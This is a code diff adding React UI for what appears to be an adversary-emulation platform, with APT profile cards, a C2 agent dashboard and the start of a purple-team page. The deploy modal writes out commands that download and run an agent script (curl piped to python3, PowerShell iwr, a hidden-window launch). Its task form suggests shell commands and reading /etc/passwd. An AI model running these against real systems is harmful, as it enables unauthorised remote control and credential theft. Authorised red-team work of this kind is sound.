+        </div>
+      )}
+    </div>
+  );
+}
+
+// ─── APT Profiles ─────────────────────────────────────────────────────────────
+function AptProfiles() {
+  const [profiles, setProfiles] = useState(null);
+  const [showForm, setShowForm] = useState(false);
+  const [err, setErr] = useState("");
+  const [saving, setSaving] = useState(false);
+  const [selected, setSelected] = useState(null);
+  const [deletingProfile, setDeletingProfile] = useState(null);
+  const [showConfirm, ConfirmNode] = useConfirm();
+
+  // Correct Literals: motivation: espionage|financial|hacktivist|sabotage|unknown
+  //                  sophistication: low|medium|high|nation_state
+  const initForm = { name:"", description:"", motivation:"espionage", sophistication:"high", targets_ot:false, attributed_country:"", is_custom:true };
+  const [form, setForm] = useState(initForm);
+
+  const load = useCallback(() => {
+    apiFetch("/apt-profiles/").then(setProfiles).catch(e => { setErr(e.message); setProfiles([]); });
+  }, []);
+  useEffect(() => { load(); }, [load]);
+
+  function set(k, v) { setForm(f => ({ ...f, [k]: v })); }
+
+  async function create(e) {
+    e.preventDefault(); setErr(""); setSaving(true);
+    try {
+      await apiFetch("/apt-profiles/", { method:"POST", body:JSON.stringify(form) });
+      setShowForm(false); setForm(initForm); load();
+    } catch(ex) { setErr(ex.message); }
+    finally { setSaving(false); }
+  }
+
+  async function deleteProfile(e, p) {
+    e.stopPropagation();
+    const ok = await showConfirm({
+      title: "Hapus APT Profile",
+      message: `Profil "${p.name}" akan dihapus permanen dan tidak bisa dipulihkan.`,
+      confirmLabel: "Ya, Hapus Profil",
+      variant: "danger",
+      icon: "fa-user-secret",
+    });
+    if (!ok) return;
+    setDeletingProfile(p.id);
+    try {
+      await apiFetch(`/apt-profiles/${p.id}`, { method:"DELETE" });
+      if (selected?.id === p.id) setSelected(null);
+      load();
+    } catch(ex) { setErr(ex.message); }
+    finally { setDeletingProfile(null); }
+  }
+
+  return (
+    <div className="space-y-5">
+      {ConfirmNode}
+      <div className="flex items-center justify-between">
+        <div><h1 className="text-xl font-bold text-slate-900">APT Profiles</h1>
+          <p className="text-sm text-slate-500 mt-1">Threat actor profiles — click a card to expand details</p></div>
+        <button className="btn-primary" onClick={() => { setErr(""); setShowForm(true); }}><i className="fa-solid fa-plus mr-2"></i>New Profile</button>
+      </div>
+      <Alert msg={err} onClose={() => setErr("")} />
+
+      {showForm && (
+        <Modal title="Create APT Profile" onClose={() => setShowForm(false)}>
+          <form onSubmit={create} className="space-y-4">
+            <Alert msg={err} onClose={() => setErr("")} />
+            <FormField label="Name" required>
+              <input className="input-field" required value={form.name} onChange={e => set("name", e.target.value)} placeholder="APT29 Custom" />
+            </FormField>
+            <div className="grid grid-cols-2 gap-3">
+              <FormField label="Motivation" required>
+                {/* Literal: espionage | financial | hacktivist | sabotage | unknown */}
+                <select className="input-field" value={form.motivation} onChange={e => set("motivation", e.target.value)}>
+                  <option value="espionage">Espionage</option>
+                  <option value="financial">Financial</option>
+                  <option value="hacktivist">Hacktivist</option>
+                  <option value="sabotage">Sabotage</option>
+                  <option value="unknown">Unknown</option>
+                </select>
+              </FormField>
+              <FormField label="Sophistication" required>
+                {/* Literal: low | medium | high | nation_state */}
+                <select className="input-field" value={form.sophistication} onChange={e => set("sophistication", e.target.value)}>
+                  <option value="low">Low</option>
+                  <option value="medium">Medium</option>
+                  <option value="high">High</option>
+                  <option value="nation_state">Nation State</option>
+                </select>
+              </FormField>
+            </div>
+            <FormField label="Attributed Country">
+              <input className="input-field" value={form.attributed_country} onChange={e => set("attributed_country", e.target.value)} placeholder="e.g. Russia, China, Unknown" />
+            </FormField>
+            <FormField label="Description">
+              <textarea className="input-field" value={form.description} onChange={e => set("description", e.target.value)} placeholder="Threat actor notes…" />
+            </FormField>
+            <div className="flex items-center gap-3">
+              <input type="checkbox" id="ot-t" checked={form.targets_ot} onChange={e => set("targets_ot", e.target.checked)} className="w-4 h-4 accent-purple-500" />
+              <label htmlFor="ot-t" className="text-sm text-slate-700">Targets OT/ICS Systems</label>
+            </div>
+            <div className="flex justify-end gap-3 pt-2">
+              <button type="button" className="btn-secondary" onClick={() => setShowForm(false)}>Cancel</button>
+              <button type="submit" className="btn-primary" disabled={saving}>{saving ? "Creating…" : "Create Profile"}</button>
+            </div>
+          </form>
+        </Modal>
+      )}
+
+      {profiles === null ? <Spinner /> : profiles.length === 0 ? (
+        <div className="card p-16 text-center">
+          <i className="fa-solid fa-user-secret text-4xl text-slate-700 mb-4 block"></i>
+          <p className="text-slate-400">No APT profiles yet</p>
+          <button className="btn-primary mt-4" onClick={() => setShowForm(true)}>Create Profile</button>
+        </div>
+      ) : (
+        <div className="grid grid-cols-2 xl:grid-cols-3 gap-4">
+          {profiles.map(p => {
+            const isOpen = selected?.id === p.id;
+            return (
+              <div key={p.id} className="card transition-all" style={isOpen?{borderColor:"#7C3AED", boxShadow:"0 0 0 2px rgba(124,58,237,0.1)"}:{}}>
+                <div className="p-5 cursor-pointer" onClick={() => setSelected(isOpen ? null : p)}>
+                  <div className="flex items-start gap-3 mb-3">
+                    <div className="w-10 h-10 rounded-lg flex items-center justify-center shrink-0" style={{background:"#EDE9FE"}}>
+                      <i className="fa-solid fa-user-secret" style={{color:"#7C3AED"}}></i>
+                    </div>
+                    <div className="flex-1 min-w-0">
+                      <div className="font-semibold text-slate-900 truncate">{p.name}</div>
+                      <div className="text-xs text-slate-500">{p.attributed_country || "Unknown"} · {p.motivation}</div>
+                    </div>
+                    <div className="flex items-center gap-2 shrink-0">
+                      {p.is_custom && (
+                        <button
+                          onClick={e => deleteProfile(e, p)}
+                          disabled={deletingProfile === p.id}
+                          title="Hapus profil custom ini"
+                          className="text-slate-600 hover:text-red-400 transition-colors disabled:opacity-30"
+                        >
+                          {deletingProfile === p.id
+                            ? <i className="fa-solid fa-circle-notch spin text-xs"></i>
+                            : <i className="fa-solid fa-trash text-xs"></i>}
+                        </button>
+                      )}
+                      <i className={`fa-solid fa-chevron-${isOpen?"up":"down"} text-slate-600 text-xs mt-0.5`}></i>
+                    </div>
+                  </div>
+                  <div className="flex flex-wrap gap-1.5 mb-2">
+                    {p.targets_ot && <span className="badge badge-amber">OT Target</span>}
+                    {p.is_custom ? <span className="badge badge-draft">Custom</span> : <span className="badge badge-active">Built-in</span>}
+                    <span className="badge badge-medium">{p.sophistication}</span>
+                  </div>
+                  <p className="text-xs text-slate-500 line-clamp-2">{p.description || "No description"}</p>
+                </div>
+
+                {isOpen && (
+                  <div className="px-5 pb-5 pt-0 space-y-3 text-sm" style={{borderTop:"1px solid #E2E8F0"}}>
+                    <div className="pt-3">
+                      {p.mitre_group_id && <div className="text-xs text-slate-500 mb-1">MITRE ID: <span className="font-mono" style={{color:"#7C3AED"}}>{p.mitre_group_id}</span></div>}
+                      {p.known_aliases?.length > 0 && (
+                        <div><div className="text-xs text-slate-500 uppercase tracking-wider mb-1.5">Known Aliases</div>
+                          <div className="flex flex-wrap gap-1">{p.known_aliases.map(a=><span key={a} className="tag-chip">{a}</span>)}</div>
+                        </div>
+                      )}
+                      {p.preferred_tools?.length > 0 && (
+                        <div className="mt-2"><div className="text-xs text-slate-500 uppercase tracking-wider mb-1.5">Preferred Tools</div>
+                          <div className="flex flex-wrap gap-1">{p.preferred_tools.map(t=><span key={t} className="tag-chip">{t}</span>)}</div>
+                        </div>
+                      )}
+                      {p.technique_preferences?.length > 0 && (
+                        <div className="mt-2"><div className="text-xs text-slate-500 uppercase tracking-wider mb-1.5">Technique Preferences</div>
+                          <div className="flex flex-wrap gap-1">{p.technique_preferences.map(t=><span key={t} className="tag-chip font-mono">{t}</span>)}</div>
+                        </div>
+                      )}
+                    </div>
+                  </div>
+                )}
+              </div>
+            );
+          })}
+        </div>
+      )}
+    </div>
+  );
+}
+
+// ─── Agents (C2 Dashboard) ────────────────────────────────────────────────────
+const OS_ICONS = { windows:"fa-brands fa-windows", linux:"fa-brands fa-linux", macos:"fa-brands fa-apple", unknown:"fa-solid fa-server" };
+const OS_COLORS = { windows:"#60a5fa", linux:"#fbbf24", macos:"#d1d5db", unknown:"#64748b" };
+const AGENT_STATUS_COLOR = { active:"#34d399", stale:"#fbbf24", terminated:"#f87171" };
+const SERVER = "http://localhost:8000";
+
+function DeployModal({ onClose }) {
+  const [os, setOs] = useState("windows");
+  const [server, setServer] = useState(SERVER);
+  const [interval, setInterval] = useState(60);
+  const [agentType, setAgentType] = useState("it");
+  const [campaignId, setCampaignId] = useState("");
+
+  const baseCmd = `python aep_agent.py --server ${server} --interval ${interval} --type ${agentType}${campaignId ? ` --campaign-id ${campaignId}` : ""}`;
+
+  const DEPLOY = {
+    windows: {
+      label: "Windows (PowerShell)",
+      icon: "fa-brands fa-windows",
+      color: "#60a5fa",
+      steps: [
+        { title: "1 — Download agent script", code: `Invoke-WebRequest -Uri "${server}/agent.py" -OutFile "$env:TEMP\\aep_agent.py"` },
+        { title: "2 — Run agent (PowerShell)", code: `python "$env:TEMP\\aep_agent.py" --server ${server} --interval ${interval} --type ${agentType}${campaignId ? ` --campaign-id ${campaignId}` : ""}` },
+        { title: "One-liner (download + run)", code: `$p="${server}"; $f="$env:TEMP\\aep.py"; (iwr "$p/agent.py" -UseBasicParsing).Content | Set-Content $f; python $f --server $p --interval ${interval} --type ${agentType}` },
+      ],
+    },
+    linux: {
+      label: "Linux / macOS (Bash)",
+      icon: "fa-brands fa-linux",
+      color: "#fbbf24",
+      steps: [
+        { title: "1 — Download agent script", code: `curl -s "${server}/agent.py" -o /tmp/aep_agent.py` },
+        { title: "2 — Run agent (Python 3)", code: `python3 /tmp/aep_agent.py --server ${server} --interval ${interval} --type ${agentType}${campaignId ? ` --campaign-id ${campaignId}` : ""}` },
+        { title: "One-liner (download + run)", code: `curl -s "${server}/agent.py" | python3 - --server ${server} --interval ${interval} --type ${agentType}` },
+      ],
+    },
+    python: {
+      label: "Python (Cross-platform)",
+      icon: "fa-brands fa-python",
+      color: "#4ade80",
+      steps: [
+        { title: "Download", code: `curl -o aep_agent.py ${server}/agent.py   # or use Invoke-WebRequest on Windows` },
+        { title: "Run", code: baseCmd },
+        { title: "Run in background (Linux)", code: `nohup ${baseCmd} > /tmp/aep.log 2>&1 &` },
+        { title: "Run in background (Windows)", code: `Start-Process python -ArgumentList "$env:TEMP\\aep_agent.py --server ${server} --interval ${interval}" -WindowStyle Hidden` },
+      ],
+    },
+  };
+
+  const cfg = DEPLOY[os];
+
+  function copy(text) {
+    navigator.clipboard?.writeText(text).catch(() => {});
+  }
+
+  return (
+    <Modal title="Deploy Agent to Target" onClose={onClose} wide>
+      {/* OS selector */}
+      <div className="flex gap-2 mb-5">
+        {Object.entries(DEPLOY).map(([k, v]) => (
+          <button key={k} onClick={() => setOs(k)}
+            className="flex-1 flex flex-col items-center gap-1.5 px-4 py-3 rounded-xl border transition-all text-sm font-semibold"
+            style={os===k ? {background:"#EDE9FE", borderColor:"#7C3AED", color:"#7C3AED"} : {background:"#F8FAFC", borderColor:"#CBD5E1", color:"#64748b"}}>
+            <i className={`${v.icon} text-xl`} style={{color: os===k ? v.color : "#475569"}}></i>
+            {v.label.split(" ")[0]}
+          </button>
+        ))}
+      </div>
+
+      {/* Config */}
+      <div className="grid grid-cols-3 gap-3 mb-5">
+        <FormField label="AEP Server URL">
+          <input className="input-field" value={server} onChange={e => setServer(e.target.value)} />
+        </FormField>
+        <FormField label="Beacon Interval (sec)">
+          <input type="number" className="input-field" value={interval} min={10} max={3600} onChange={e => setInterval(parseInt(e.target.value)||60)} />
+        </FormField>
+        <FormField label="Agent Type">
+          <select className="input-field" value={agentType} onChange={e => setAgentType(e.target.value)}>
+            <option value="it">IT (Enterprise)</option>
+            <option value="ot">OT (ICS/SCADA)</option>
+          </select>
+        </FormField>
+      </div>
+      <div className="mb-5">
+        <FormField label="Campaign ID (optional)" hint="Attach agent to specific campaign from the start">
+          <input className="input-field" value={campaignId} onChange={e => setCampaignId(e.target.value)} placeholder="Leave blank to attach later" />
+        </FormField>
+      </div>
+
+      {/* Commands */}
+      <div className="space-y-3">
+        {cfg.steps.map((s, i) => (
+          <div key={i}>
+            <div className="text-xs text-slate-500 font-semibold mb-1">{s.title}</div>
+            <div className="relative group">
+              <div className="sigma-block pr-16">{s.code}</div>
+              <button onClick={() => copy(s.code)}
+                className="absolute right-2 top-2 btn-sm btn-ghost opacity-0 group-hover:opacity-100 transition-opacity">
+                <i className="fa-regular fa-copy"></i> Copy
+              </button>
+            </div>
+          </div>
+        ))}
+      </div>
+
+      <div className="mt-4 p-3 rounded-lg text-xs text-slate-600" style={{background:"#EFF6FF", border:"1px solid #BFDBFE"}}>
+        <i className="fa-solid fa-circle-info text-blue-500 mr-2"></i>
+        Agent membutuhkan <strong className="text-slate-900">Python 3.8+</strong> di target machine.
+        Setelah running, agent otomatis muncul di daftar di bawah.
+        Token hanya ditampilkan sekali di output terminal agent.
+      </div>
+    </Modal>
+  );
+}
+
+function AgentTaskPanel({ agent, onClose }) {
+  const [tasks, setTasks] = useState(null);
+  const [err, setErr] = useState("");
+  const [success, setSuccess] = useState("");
+  const [showQueue, setShowQueue] = useState(false);
+  const [selectedTask, setSelectedTask] = useState(null);
+  const [qForm, setQForm] = useState({ task_type:"execute_technique", technique_id:"", priority:5, timeout_seconds:300, task_params:{} });
+  const [rawParams, setRawParams] = useState("{}");
+  const [showConfirm, ConfirmNode] = useConfirm();
+
+  const TASK_TYPES = [
+    "execute_technique","shell_command","powershell","python_exec",
+    "file_read","file_write","process_enum","network_scan",
+  ];
+
+  const load = useCallback(() => {
+    apiFetch(`/agents/${agent.id}/tasks`).then(setTasks).catch(e => { setErr(e.message); setTasks([]); });
+  }, [agent.id]);
+  useEffect(() => { load(); }, [load]);
+
+  async function queueTask(e) {
+    e.preventDefault(); setErr("");
+    try {
+      let params = {};
+      try { params = JSON.parse(rawParams); } catch { params = {}; }
+      const body = { ...qForm, task_params: params };
+      if (!body.technique_id) delete body.technique_id;
+      await apiFetch(`/agents/${agent.id}/tasks`, { method:"POST", body:JSON.stringify(body) });
+      setSuccess("Task queued — agent will pick it up on next beacon");
+      setShowQueue(false);
+      load();
+    } catch(ex) { setErr(ex.message); }
+  }
+
+  async function terminateAgent() {
+    const ok = await showConfirm({
+      title: "Terminate Agent",
+      message: `Agent "${agent.hostname}" akan dihentikan dan tidak akan menerima task baru.\nSemua pending tasks akan dibatalkan.`,
+      confirmLabel: "Ya, Terminate",
+      variant: "danger",
+      icon: "fa-skull",
+    });
+    if (!ok) return;
+    try {
+      await apiFetch(`/agents/${agent.id}?reason=manual+terminate`, { method:"DELETE" });
+      setSuccess("Agent terminated");
+      onClose();
+    } catch(ex) { setErr(ex.message); }
+  }
+
+  const statusDot = { pending:"#fbbf24", queued:"#fbbf24", running:"#60a5fa", completed:"#34d399", failed:"#f87171", cancelled:"#64748b" };
+
+  return ReactDOM.createPortal(
+    <>
+    {ConfirmNode}
+    <div className="fixed inset-0 z-[150] flex" style={{background:"rgba(15,30,60,0.5)"}} onClick={e => e.target===e.currentTarget && onClose()}>
+      <div className="ml-auto w-[520px] h-full flex flex-col" style={{background:"#ffffff", borderLeft:"1px solid #E2E8F0", boxShadow:"-4px 0 24px rgba(0,0,0,0.1)"}}>
+        {/* Header */}
+        <div className="px-5 py-4 flex items-center justify-between shrink-0" style={{borderBottom:"1px solid #E2E8F0", background:"#1E2D4A"}}>
+          <div className="flex items-center gap-3">
+            <i className={`${OS_ICONS[agent.os_type]||OS_ICONS.unknown} text-xl`} style={{color:OS_COLORS[agent.os_type]||OS_COLORS.unknown}}></i>
+            <div>
+              <div className="font-semibold text-white">{agent.hostname}</div>
+              <div className="text-xs text-slate-300">{agent.ip_address} · {agent.os_type}</div>
+            </div>
+          </div>
+          <button onClick={onClose} className="text-slate-300 hover:text-white w-7 h-7 flex items-center justify-center rounded-lg hover:bg-white/10">
+            <i className="fa-solid fa-xmark"></i>
+          </button>
+        </div>
+
+        {/* Agent info */}
+        <div className="px-5 py-3 shrink-0" style={{borderBottom:"1px solid #E2E8F0", background:"#F8FAFC"}}>
+          <div className="grid grid-cols-3 gap-3 text-xs">
+            {[["Status", <span style={{color:AGENT_STATUS_COLOR[agent.status]||"#94a3b8"}} className="font-semibold">{agent.status}</span>],
+              ["Type", agent.agent_type?.toUpperCase()],
+              ["Privilege", agent.privilege_level||"—"],
+              ["Beacon", `${agent.beacon_interval}s`],
+              ["Last seen", agent.last_seen?new Date(agent.last_seen).toLocaleTimeString():"Never"],
+              ["Tasks done", agent.tasks_completed??0],
+            ].map(([l,v])=>(
+              <div key={l}><div className="text-slate-500 uppercase tracking-wider mb-0.5">{l}</div><div className="text-slate-800">{v}</div></div>
+            ))}
+          </div>
+          {agent.capabilities?.length > 0 && (
+            <div className="mt-2 flex flex-wrap gap-1">
+              {agent.capabilities.map(c => <span key={c} className="tag-chip">{c}</span>)}
+            </div>
+          )}
+        </div>
+
+        <Alert msg={err} onClose={() => setErr("")} />
+        <Alert type="success" msg={success} onClose={() => setSuccess("")} />
+
+        {/* Task controls */}
+        <div className="px-5 py-3 flex items-center justify-between shrink-0" style={{borderBottom:"1px solid #E2E8F0"}}>
+          <span className="text-sm font-semibold text-slate-900">Task Queue ({tasks?.length ?? "…"})</span>
+          <div className="flex gap-2">
+            <button className="btn-sm btn-purple" onClick={() => setShowQueue(!showQueue)}><i className="fa-solid fa-plus"></i>Queue Task</button>
+            <button className="btn-sm" style={{background:"#F1F5F9",color:"#64748b",border:"1px solid #CBD5E1"}} onClick={load}><i className="fa-solid fa-rotate-right"></i></button>
+            {agent.status !== "terminated" && (
+              <button className="btn-sm btn-red" onClick={terminateAgent}><i className="fa-solid fa-skull"></i>Terminate</button>
+            )}
+          </div>
+        </div>
+
+        {/* Queue form */}
+        {showQueue && (
+          <div className="px-5 py-4 shrink-0" style={{borderBottom:"1px solid #E2E8F0", background:"#F8FAFC"}}>
+            <form onSubmit={queueTask} className="space-y-3">
+              <div className="grid grid-cols-2 gap-3">
+                <FormField label="Task Type">
+                  <select className="input-field" value={qForm.task_type} onChange={e => setQForm(f=>({...f,task_type:e.target.value}))}>
+                    {TASK_TYPES.map(t => <option key={t} value={t}>{t}</option>)}
+                  </select>
+                </FormField>
+                <FormField label="Technique ID" hint="e.g. T1057, T1082">
+                  <input className="input-field" value={qForm.technique_id}
+                    onChange={e => setQForm(f=>({...f,technique_id:e.target.value.toUpperCase()}))}
+                    placeholder="T1057" />
+                </FormField>
+              </div>
+              <div className="grid grid-cols-2 gap-3">
+                <FormField label="Priority (1–10)">
+                  <input type="number" min={1} max={10} className="input-field" value={qForm.priority}
+                    onChange={e => setQForm(f=>({...f,priority:parseInt(e.target.value)||5}))} />
+                </FormField>
+                <FormField label="Timeout (sec)">
+                  <input type="number" min={30} className="input-field" value={qForm.timeout_seconds}
+                    onChange={e => setQForm(f=>({...f,timeout_seconds:parseInt(e.target.value)||300}))} />
+                </FormField>
+              </div>
+              <FormField label="Params (JSON)" hint={`shell_command: {"command":"whoami"} | file_read: {"path":"/etc/passwd"} | network_scan: {"target":"10.0.0.1"}`}>
+                <textarea className="input-field font-mono text-xs" rows={3} value={rawParams}
+                  onChange={e => setRawParams(e.target.value)}
+                  placeholder='{"command": "whoami && hostname"}' />
+              </FormField>
+              <div className="flex gap-2">
+                <button type="submit" className="btn-sm btn-emerald"><i className="fa-solid fa-paper-plane"></i>Send Task</button>
+                <button type="button" className="btn-ghost btn-sm" onClick={() => setShowQueue(false)}>Cancel</button>
+              </div>
+            </form>
+          </div>
+        )}
+
+        {/* Task list */}
+        <div className="flex-1 overflow-y-auto px-5 py-4 space-y-2">
+          {tasks === null ? <Spinner size="sm" /> : tasks.length === 0 ? (
+            <div className="text-center text-slate-600 py-8 text-sm">No tasks yet — queue a task above</div>
+          ) : tasks.map(t => (
+            <div key={t.id} className="rounded-xl p-3 cursor-pointer transition-all"
+              style={{background: selectedTask===t.id?"#EFF6FF":"#F8FAFC", border:`1px solid ${selectedTask===t.id?"#93C5FD":"#E2E8F0"}`}}
+              onClick={() => setSelectedTask(selectedTask===t.id ? null : t.id)}>
+              <div className="flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  <span className="w-2 h-2 rounded-full shrink-0" style={{background:statusDot[t.status]||"#64748b"}}></span>
+                  <span className="text-xs font-mono font-semibold" style={{color:"#7C3AED"}}>{t.technique_id||"—"}</span>
+                  <span className="text-xs text-slate-500">{t.task_type}</span>
+                </div>
+                <div className="flex items-center gap-2">
+                  <span className={`badge badge-${t.status==="completed"?"active":t.status==="failed"?"aborted":t.status==="running"?"validating":"draft"}`}>{t.status}</span>
+                  {t.duration_seconds && <span className="text-xs text-slate-600">{t.duration_seconds.toFixed(1)}s</span>}
+                </div>
+              </div>
+
+              {/* Expanded output */}
+              {selectedTask === t.id && (
+                <div className="mt-3 space-y-2">
+                  {t.output && (
+                    <div>
+                      <div className="text-xs text-slate-500 mb-1">Output:</div>
+                      <div className="sigma-block max-h-48 overflow-y-auto">{t.output}</div>
+                    </div>
+                  )}
+                  {t.result_status && <div className="text-xs text-slate-500">Result: <span className={t.result_status==="success"?"text-emerald-400":"text-red-400"}>{t.result_status}</span></div>}
+                  {t.completed_at && <div className="text-xs text-slate-600">Completed: {new Date(t.completed_at).toLocaleString()}</div>}
+                </div>
+              )}
+            </div>
+          ))}
+        </div>
+      </div>
+    </div>
+    </>,
+    document.body
+  );
+}
+
+function Agents() {
+  const [agents, setAgents] = useState(null);
+  const [err, setErr] = useState("");
+  const [showDeploy, setShowDeploy] = useState(false);
+  const [selected, setSelected] = useState(null);
+  const [autoRefresh, setAutoRefresh] = useState(true);
+
+  const load = useCallback(() => {
+    apiFetch("/agents/").then(setAgents).catch(e => { setErr(e.message); setAgents([]); });
+  }, []);
+
+  useEffect(() => { load(); }, [load]);
+
+  // Auto-refresh every 15s
+  useEffect(() => {
+    if (!autoRefresh) return;
+    const t = setInterval(load, 15000);
+    return () => clearInterval(t);
+  }, [autoRefresh, load]);
+
+  const active  = agents?.filter(a => a.status === "active").length ?? 0;
+  const stale   = agents?.filter(a => a.status === "stale").length ?? 0;
+  const total   = agents?.length ?? 0;
+
+  return (
+    <div className="space-y-5">
+      <div className="flex items-center justify-between flex-wrap gap-3">
+        <div>
+          <h1 className="text-xl font-bold text-slate-900">Agent Framework <span className="text-sm font-normal text-slate-500 ml-2">C2 Dashboard</span></h1>
+          <p className="text-sm text-slate-500 mt-1">Deploy agents to target machines — control and task execution</p>
+        </div>
+        <div className="flex gap-2 items-center">
+          <label className="flex items-center gap-2 text-xs text-slate-500 cursor-pointer">
+            <input type="checkbox" checked={autoRefresh} onChange={e => setAutoRefresh(e.target.checked)} className="accent-purple-500" />
+            Auto-refresh 15s
+          </label>
+          <button className="btn-secondary text-sm" onClick={load}><i className="fa-solid fa-rotate-right mr-1.5"></i>Refresh</button>
+          <button className="btn-primary" onClick={() => setShowDeploy(true)}><i className="fa-solid fa-terminal mr-2"></i>Deploy Agent</button>
+        </div>
+      </div>
+
+      {showDeploy && <DeployModal onClose={() => setShowDeploy(false)} />}
+      {selected   && <AgentTaskPanel agent={selected} onClose={() => { setSelected(null); load(); }} />}
+
+      <Alert msg={err} onClose={() => setErr("")} />
+
+      {/* Stats */}
+      {agents !== null && agents.length > 0 && (
+        <div className="grid grid-cols-4 gap-4">
+          <StatCard icon="fa-robot"        color="emerald" title="Active Agents"    value={active}           sub="Currently beaconing" />
+          <StatCard icon="fa-circle-exclamation" color="amber" title="Stale Agents" value={stale}           sub="Missed last beacon" />
+          <StatCard icon="fa-server"       color="blue"    title="Total Registered" value={total}            sub="All platforms" />
+          <StatCard icon="fa-list-check"   color="purple"  title="Tasks Completed"  value={agents.reduce((s,a)=>s+(a.tasks_completed||0),0)} sub="Across all agents" />
+        </div>
+      )}
+
+      {agents === null ? <Spinner /> : agents.length === 0 ? (
+        <div className="card p-10">
+          <div className="text-center mb-8">
+            <i className="fa-solid fa-robot text-5xl text-slate-700 mb-4 block"></i>
+            <p className="text-slate-400 font-medium mb-1">No agents connected</p>
+            <p className="text-slate-500 text-sm mb-4">Click <strong className="text-blue-600">Deploy Agent</strong> to get deployment commands</p>
+            <button className="btn-primary" onClick={() => setShowDeploy(true)}><i className="fa-solid fa-terminal mr-2"></i>Deploy Agent</button>
+          </div>
+          <div className="grid grid-cols-3 gap-4">
+            {[
+              { os:"Windows", icon:"fa-brands fa-windows", color:"#60a5fa",
+                cmd:`# PowerShell — paste into target machine\n$p="http://localhost:8000"\n(iwr "$p/agent.py" -UseBasicParsing).Content | Set-Content "$env:TEMP\\aep.py"\npython "$env:TEMP\\aep.py" --server $p` },
+              { os:"Linux", icon:"fa-brands fa-linux", color:"#fbbf24",
+                cmd:`# Bash — paste into target machine\ncurl -s http://localhost:8000/agent.py -o /tmp/aep.py\npython3 /tmp/aep.py --server http://localhost:8000` },
+              { os:"Python", icon:"fa-brands fa-python", color:"#4ade80",
+                cmd:`# Cross-platform Python\ncurl -o aep_agent.py http://localhost:8000/agent.py\npython aep_agent.py --server http://localhost:8000 --interval 30` },
+            ].map(p => (
+              <div key={p.os} className="card p-4">
+                <div className="flex items-center gap-2 mb-3">
+                  <i className={`${p.icon} text-lg`} style={{color:p.color}}></i>
+                  <span className="font-semibold text-slate-900 text-sm">{p.os}</span>
+                </div>
+                <div className="sigma-block text-xs">{p.cmd}</div>
+              </div>
+            ))}
+          </div>
+        </div>
+      ) : (
+        <div className="card overflow-hidden">
+          <div className="px-5 py-3 flex items-center justify-between" style={{borderBottom:"1px solid #E2E8F0", background:"#F8FAFC"}}>
+            <span className="text-xs text-slate-500">{total} agent{total!==1?"s":""} registered — click a row to open C2 panel</span>
+          </div>
+          <table className="w-full text-sm">
+            <thead><tr style={{background:"#F8FAFC", borderBottom:"1px solid #E2E8F0"}}>
+              {["","Hostname","IP Address","OS / Version","Type","Privilege","Status","Last Beacon","Tasks",""].map(h=>(
+                <th key={h} className="text-left px-4 py-3 text-xs font-semibold text-slate-500 uppercase tracking-wider">{h}</th>
+              ))}
+            </tr></thead>
+            <tbody className="divide-y" style={{borderColor:"#E2E8F0"}}>
+              {agents.map(a => (
+                <tr key={a.id} className="table-row cursor-pointer" onClick={() => setSelected(a)}>
+                  {/* OS icon */}
+                  <td className="px-4 py-3 w-10">
+                    <i className={`${OS_ICONS[a.os_type]||OS_ICONS.unknown} text-lg`} style={{color:OS_COLORS[a.os_type]||OS_COLORS.unknown}}></i>
+                  </td>
+                  <td className="px-4 py-3">
+                    <div className="font-semibold text-slate-900">{a.hostname}</div>
+                    <div className="text-xs text-slate-400 font-mono">{a.id?.slice(0,12)}…</div>
+                  </td>
+                  <td className="px-4 py-3 font-mono text-slate-600 text-xs">{a.ip_address||"—"}</td>
+                  <td className="px-4 py-3">
+                    <div className="text-slate-700">{a.os_type}</div>
+                    <div className="text-xs text-slate-400 truncate max-w-[160px]">{a.os_version?.slice(0,40)||"—"}</div>
+                  </td>
+                  <td className="px-4 py-3">
+                    <span className={`badge ${a.agent_type==="ot"?"badge-amber":"badge-draft"}`}>{a.agent_type?.toUpperCase()}</span>
+                  </td>
+                  <td className="px-4 py-3">
+                    <span className={`badge ${a.privilege_level==="root"||a.privilege_level==="admin"?"badge-high":"badge-draft"}`}>
+                      {a.privilege_level==="root"||a.privilege_level==="admin"
+                        ? <><i className="fa-solid fa-crown mr-1 text-xs"></i>{a.privilege_level}</>
+                        : a.privilege_level||"user"}
+                    </span>
+                  </td>
+                  <td className="px-4 py-3">
+                    <div className="flex items-center gap-2">
+                      <span className="w-2 h-2 rounded-full" style={{background:AGENT_STATUS_COLOR[a.status]||"#64748b",
+                        boxShadow:a.status==="active"?"0 0 6px #34d399":""}}></span>
+                      <span className="font-semibold" style={{color:AGENT_STATUS_COLOR[a.status]||"#94a3b8"}}>{a.status}</span>
+                    </div>
+                  </td>
+                  <td className="px-4 py-3 text-slate-400 text-xs">
+                    {a.last_seen ? (
+                      <div>
+                        <div>{new Date(a.last_seen).toLocaleTimeString()}</div>
+                        <div className="text-slate-600">{new Date(a.last_seen).toLocaleDateString()}</div>
+                      </div>
+                    ) : "Never"}
+                  </td>
+                  <td className="px-4 py-3 text-center">
+                    <div className="text-slate-900 font-semibold">{a.tasks_completed??0}</div>
+                    <div className="text-xs text-slate-400">{a.tasks_queued??0} queued</div>
+                  </td>
+                  <td className="px-4 py-3">
+                    <button className="btn-sm btn-purple" onClick={e => { e.stopPropagation(); setSelected(a); }}>
+                      <i className="fa-solid fa-terminal"></i>Control
+                    </button>
+                  </td>
+                </tr>
+              ))}
+            </tbody>
+          </table>
+        </div>
+      )}
+    </div>
+  );
+}
+
+// ─── Purple Team ──────────────────────────────────────────────────────────────
+function PurpleTeam({ navigate }) {
+  const [sessions, setSessions] = useState(null);
+  const [showForm, setShowForm] = useState(false);
+  const [err, setErr] = useState("");
+  const [saving, setSaving] = useState(false);
+  const [deletingSession, setDeletingSession] = useState(null);
+  const [showConfirm, ConfirmNode] = useConfirm();
+  const initForm = { name:"", environment:"it", description:"", red_team_lead:"", blue_team_lead:"", facilitator:"" };
+  const [form, setForm] = useState(initForm);
+
+  const load = useCallback(() => {
+    apiFetch("/purple/sessions").then(setSessions).catch(e => { setErr(e.message); setSessions([]); });
+  }, []);
+  useEffect(() => { load(); }, [load]);
+
+  function set(k,v) { setForm(f=>({...f,[k]:v})); }
+
+  async function create(e) {
+    e.preventDefault(); setErr(""); setSaving(true);
+    try {
+      await apiFetch("/purple/sessions", { method:"POST", body:JSON.stringify(form) });
+      setShowForm(false); setForm(initForm); load();
+    } catch(ex) { setErr(ex.message); }
+    finally { setSaving(false); }
+  }
+
+  async function deleteSession(e, s) {
+    e.stopPropagation();
+    const ok = await showConfirm({
+      title: "Hapus Purple Session",
